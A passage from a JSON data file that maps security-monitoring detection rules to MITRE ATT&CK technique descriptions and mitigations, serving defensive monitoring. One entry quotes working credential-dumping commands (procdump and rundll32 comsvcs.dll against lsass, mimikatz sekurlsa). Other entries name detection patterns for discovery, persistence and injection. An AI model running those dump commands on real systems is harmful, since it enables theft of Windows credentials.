            "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information]( for [User Execution]( The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse [Command Obfuscation]( to obscure commands executed from payloads or directly via [Command and Scripting Interpreter]( Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   "
        ],
        "mitigation_strategies": [
            "Ensure that a finite amount of ingress points to a software deployment system exist with restricted access for those required to allow and enable newly deployed software."
        ]
    },
    {
        "rule_id": 91829,
        "rule_description": "Powershell executed \"GetComputerNameEx\". Possible system configuration discovery",
        "mitre_id": [
            "T1082"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91830,
        "rule_description": "Powershell executed \"NetWkstaGetInfo\". Possible network configuration discovery",
        "mitre_id": [
            "T1016"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91831,
        "rule_description": "Powershell executed \"GetUserNameEx\". Possible user information discovery",
        "mitre_id": [
            "T1033"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91832,
        "rule_description": "Powershell executed \"CreateToolhelp32Snapshot\". Possible process discovery",
        "mitre_id": [
            "T1057"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91833,
        "rule_description": "Possible discovery activity: Powershell executed \"Get-ChildItem\" command on a system folder",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91834,
        "rule_description": "Powershell executed a command that modifies file timestamp, possible timestomp attempt",
        "mitre_id": [
            "T1070.006"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91835,
        "rule_description": "Powershell tampering with WMI AntiVirusProduct class - Antivirus Software discovery",
        "mitre_id": [
            "T1518.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91836,
        "rule_description": "Powershell tampering software installation info on system registry",
        "mitre_id": [
            "T1012"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91837,
        "rule_description": "Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 91838,
        "rule_description": "Powershell queried Win32_BIOS. Possible sandbox detection activity",
        "mitre_id": [
            "T1497",
            "T1082"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91839,
        "rule_description": "Powershell queried Win32_ComputerSystem. Possible system discovery activity",
        "mitre_id": [
            "T1497",
            "T1033",
            "T1016"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91840,
        "rule_description": "Powershell queried Win32_PnPEntity. Possible devices/adapter discovery activity",
        "mitre_id": [
            "T1120"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91841,
        "rule_description": "Powershell queried Win32_Process. Possible process discovery activity",
        "mitre_id": [
            "T1057"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91842,
        "rule_description": "Powershell executed \"Get-Item -Path\". Script trying to see files in path",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91843,
        "rule_description": "Powershell executed \"New-ItemProperty -Path\". Possible addition of new item to registry",
        "mitre_id": [
            "T1059.001",
            "T1112"
        ],
        "possible_attacks": [
            "PowerShell",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 91844,
        "rule_description": "Possible addition of new item to Windows startup registry",
        "mitre_id": [
            "T1547.001",
            "T1059.001",
            "T1112"
        ],
        "possible_attacks": [
            "PowerShell",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 91845,
        "rule_description": "Outlook add-in was loaded by powershell, possible use for email collection",
        "mitre_id": [
            "T1114.001"
        ],
        "possible_attacks": [
            "Local Email Collection"
        ],
        "description": [
            "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`."
        ],
        "mitigation_strategies": [
            "Implement secure out-of-band alerts to notify security teams of unusual local email activities, such as mass forwarding or large attachments being sent, indicating potential data exfiltration attempts."
        ]
    },
    {
        "rule_id": 91846,
        "rule_description": "Powershell used .NET compression method, possible data extraction operation",
        "mitre_id": [
            "T1560.001"
        ],
        "possible_attacks": [
            "Archive via Utility"
        ],
        "description": [
            "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging]( <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil]( to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities."
        ],
        "mitigation_strategies": [
            "System scans can be performed to identify unauthorized archival utilities."
        ]
    },
    {
        "rule_id": 92900,
        "rule_description": "Lsass process was accessed by $(win.eventdata.sourceImage) with read permissions, possible credential dump",
        "mitre_id": [
            "T1003.001"
        ],
        "possible_attacks": [
            "LSASS Memory"
        ],
        "description": [
            "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement]( using [Use Alternate Authentication Material](\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>\n\nSimilar to [Image File Execution Options Injection]( the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.\n"
        ],
        "mitigation_strategies": [
            "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."
        ]
    },
    {
        "rule_id": 92910,
        "rule_description": "Explorer process was accessed by $(win.eventdata.sourceImage), possible process injection",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 92920,
        "rule_description": "Windows Remote Dektop utility process was accessed by $(win.eventdata.sourceImage), possible process injection",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 89501,
        "rule_description": "WmiConsumerEvent created, possible persistence tactic",
        "mitre_id": [
            "T1546.003"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation Event Subscription"
        ],
        "description": [
            "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI."
        ]
    },
    {
        "rule_id": 89502,
        "rule_description": "WmiConsumerEvent created, possible persistence tactic using command-executing binaries",
        "mitre_id": [
            "T1546.003"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation Event Subscription"
        ],
        "description": [
            "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI."
        ]
    },
    {
        "rule_id": 67014,
        "rule_description": "Task Scheduler: $(win.eventdata.message).",
        "mitre_id": [
            "T1053.005"
        ],
        "possible_attacks": [
            "Scheduled Task"
        ],
        "description": [
            "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks]( utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation]( (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution]( adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts]( that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys. "
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. "
        ]
    },
    {
        "rule_id": 67015,
        "rule_description": "Task Scheduler: $(win.eventdata.message).",
        "mitre_id": [
            "T1053.005"
        ],
        "possible_attacks": [
            "Scheduled Task"
        ],
        "description": [
            "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks]( utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation]( (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution]( adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts]( that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys. "
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. "
        ]
    },
    {
        "rule_id": 67016,
        "rule_description": "Task Scheduler: $(win.eventdata.message).",
        "mitre_id": [
            "T1053.005"
        ],
        "possible_attacks": [
            "Scheduled Task"
        ],
        "description": [
            "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks]( utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation]( (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution]( adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts]( that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys. "
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. "
        ]
    },
    {
        "rule_id": 67017,
        "rule_description": "A network share was accessed.",
        "mitre_id": [
            "T1021.002"
        ],
        "possible_attacks": [
            "SMB/Windows Admin Shares"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts]( to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job]( [Service Execution]( and [Windows Management Instrumentation]( Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash]( and certain configuration and patch levels."
        ],
        "mitigation_strategies": [
            "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems."
        ]
    },
    {
        "rule_id": 67018,
        "rule_description": "System shutdown initiated.",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 67028,
        "rule_description": "Special privileges assigned to new logon.",
        "mitre_id": [
            "T1484"
        ],
        "possible_attacks": [
            "Domain or Tenant Policy Modification"
        ],
        "description": [
            "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\n\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\n\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs to push a malicious [Scheduled Task]( to computers throughout the domain environment\n* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources\n* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](\n* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant \n\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators."
        ],
        "mitigation_strategies": [
            "Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to."
        ]
    },
    {
        "rule_id": 67029,
        "rule_description": "RDP: $(win.system.message).",
        "mitre_id": [
            "T1021.001"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary."
        ]
    },
    {
        "rule_id": 89600,
        "rule_description": "$(application) has been granted permission to $(service) at $(time).",
        "mitre_id": [
            "T1222.002"
        ],
        "possible_attacks": [
            "Linux and Mac File and Directory Permissions Modification"
        ],
        "description": [
            "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification]( or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow]( "
        ],
        "mitigation_strategies": [
            "Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists."
        ]
    },
    {
        "rule_id": 89601,
        "rule_description": "$(application) has been denied permission to $(service) at $(time).",
        "mitre_id": [
            "T1222.002"
        ],
        "possible_attacks": [
            "Linux and Mac File and Directory Permissions Modification"
        ],
        "description": [
            "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification]( or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow]( "
        ],
        "mitigation_strategies": [
            "Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists."
        ]
    },
    {
        "rule_id": 89606,
        "rule_description": "Attempt to connect to screen sharing with username $(dstuser) from $(ip_address) failed.",
        "mitre_id": [
            "T1021",
            "T1078"
        ],
        "possible_attacks": [
            "Remote Services",
            "Valid Accounts"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools]( and other administrative programs) may utilize [Remote Services]( to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC]( to send the screen and control buffers and [SSH]( for secure file transfer. Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.",
